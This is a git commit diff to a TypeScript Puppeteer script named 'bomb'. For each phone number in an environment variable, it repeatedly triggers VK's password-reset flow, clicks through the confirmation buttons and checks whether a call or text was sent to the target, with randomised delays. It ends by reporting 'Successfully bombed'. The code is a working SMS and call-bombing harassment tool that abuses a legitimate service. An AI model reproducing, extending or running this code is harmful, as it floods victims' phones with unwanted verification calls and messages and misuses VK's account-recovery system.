0a80ef5ba4198138d60e7df03382630e781106b8
Matvey <morozovmatvej75@gmail.com>
2023-04-28 19:30:44 +0300

    detect code delivery behavior

--- src/bomb.ts
+++ src/bomb.ts
@@ -3,23 +3,57 @@ import puppeteer from "puppeteer";
 import wait from "./utils/wait";
 import selectors from "./selectors";
 import range from "./utils/range";
+import fs from "node:fs";
+import doesStrExistOnPage from "./utils/doesStrExistOnPage";
 
 export async function bomb(req: Request, res: Response) {
   const phoneNumbersStr = process.env.PHONE_NUMBERS;
   if (!phoneNumbersStr) throw new Error("no phone numbers are provided");
-
+  
   const phoneNumbers = phoneNumbersStr.split(" ");
-
-  phoneNumbers.forEach(async (phoneNumber) => {
-    const browser = await puppeteer.launch({ headless: false });
+  
+  const browser = await puppeteer.launch({ headless: false });
+  console.log("Browser launched...");
+  
+  for (let i = 0; i < phoneNumbers.length; i++) {
+    const phoneNumber = phoneNumbers[i];
     const page = await browser.newPage();
-
+    
     await page.goto("https://id.vk.com/restore/#/resetPassword");
-    await wait(3000);
+    await wait(range(1000, 5000));
+  
+    await page.waitForSelector(selectors.phoneNumberInput);
     await page.type(selectors.phoneNumberInput, phoneNumber);
+    await wait(range(500, 1000));
     await page.keyboard.down("Enter");
-    await wait(3000);
+  
+    await page.waitForSelector(selectors.firstConfirmBtn);
+    await wait(range(1000, 3000));
+    await page.click(selectors.firstConfirmBtn);
+    await wait(5000);
+  
+    const shouldConfirmAgainBtn = await page.$(selectors.secondConfirmBtn);
+    if (shouldConfirmAgainBtn) await page.click(selectors.secondConfirmBtn);
+    console.log(shouldConfirmAgainBtn);
+    
+    await wait(5000);
 
-    await browser.close();
-  })
+    const hasCalled = await doesStrExistOnPage(page, "Last 4 digits");
+    const hasTexted = await doesStrExistOnPage(page, "We have sent a text message");
+
+    if (hasCalled) {
+      console.log("calling");
+    } else if (hasTexted) {
+      console.log("sent text msg");
+    } else throw new Error(`neither code delivery behavior is detected`);
+
+    await wait(range(1000, 5000));
+
+  
+
+
+  }
+  // await browser.close();
+
+  res.status(200).send("Successfully bombed");
 }
--- src/selectors.ts
+++ src/selectors.ts
@@ -1,7 +1,15 @@
 const selectors = {
   phoneNumberInput: "#reset > div > section > div.vkuiGroup__inner > div > form > div > div.vkuiFormItem.vkuiFormItem--sizeY-none > span > input",
   firstConfirmBtn: "#root > div > div > div.vkuiSplitLayout__inner.vkuiSplitLayout__inner--header.App__layout > div > div > div > div > div > div.vkuiSplitLayout__inner > section > div > div > div > div > div > section > div.vkuiGroup__inner > div.vkuiDiv.CUAPhoneIntro__footer-common--skocjj > button > span.vkuiButton__in > span",
-  secondConfirmBtn: "#root > div > div > div.vkuiSplitLayout__inner.vkuiSplitLayout__inner--header.App__layout > div > div > div > div > div > div.vkuiSplitLayout__inner > section > div > div > div > div > div > div.CUACentered-common--skocjj > section > div.vkuiGroup__inner > div > form > div > div.vkuiFormItem.vkuiFormItem--sizeY-none.PhoneVerifyIntroButton__desktop-common--skocjj > button > span.vkuiButton__in > span"
+  secondConfirmBtn: "#root > div > div > div.vkuiSplitLayout__inner.vkuiSplitLayout__inner--header.App__layout > div > div > div > div > div > div.vkuiSplitLayout__inner > section > div > div > div > div > div > div.CUACentered-common--skocjj > section > div.vkuiGroup__inner > div > form > div > div.vkuiFormItem.vkuiFormItem--sizeY-none.PhoneVerifyIntroButton__desktop-common--skocjj > button > span.vkuiButton__in > span",
+  sentTextMsg: "#root > div > div > div.vkuiSplitLayout__inner.vkuiSplitLayout__inner--header.App__layout > div > div > div > div > div > div.vkuiSplitLayout__inner > section > div > div > div > div > div > section > div.vkuiGroup__inner > div > div > div > div.CUAHero__text-common--skocjj > span",
+  callingMsg: "#root > div > div > div.vkuiSplitLayout__inner.vkuiSplitLayout__inner--header.App__layout > div > div > div > div > div > div.vkuiSplitLayout__inner > section > div > div > div > div > div > section > div.vkuiGroup__inner > div > div.CUAProcessContainer__hero-common--skocjj > div > div > span",
+  afterCalling: {
+    sendSmsBtn: "#root > div > div > div.vkuiSplitLayout__inner.vkuiSplitLayout__inner--header.App__layout > div > div > div > div > div > div.vkuiSplitLayout__inner > section > div > div > div > div > div > section > div.vkuiGroup__inner > div > form > div > div.vkuiFormItem.vkuiFormItem--sizeY-none.CUAProcessContainer__actions-common--skocjj.CUAProcessContainer__actions--desktop-common--skocjj > button > span.vkuiButton__in > span"
+  },
+  afterSentTextMsg: {
+    sendSmsBtn: "#root > div > div > div.vkuiSplitLayout__inner.vkuiSplitLayout__inner--header.App__layout > div > div > div > div > div > div.vkuiSplitLayout__inner > section > div > div > div > div > div > section > div.vkuiGroup__inner > div > form > div > div.vkuiFormItem.vkuiFormItem--sizeY-none.CUAProcessContainer__actions-common--skocjj.CUAProcessContainer__actions--desktop-common--skocjj > button.vkuiButton.vkuiButton--size-m.vkuiButton--mode-tertiary.vkuiButton--appearance-accent.vkuiButton--align-center.vkuiButton--sizeY-none.vkuiButton--android.vkuiTappable.vkuiTappable--sizeX-none.vkuiTappable--hover-has.vkuiTappable--hasActive"
+  }
 }
 
 export default selectors;
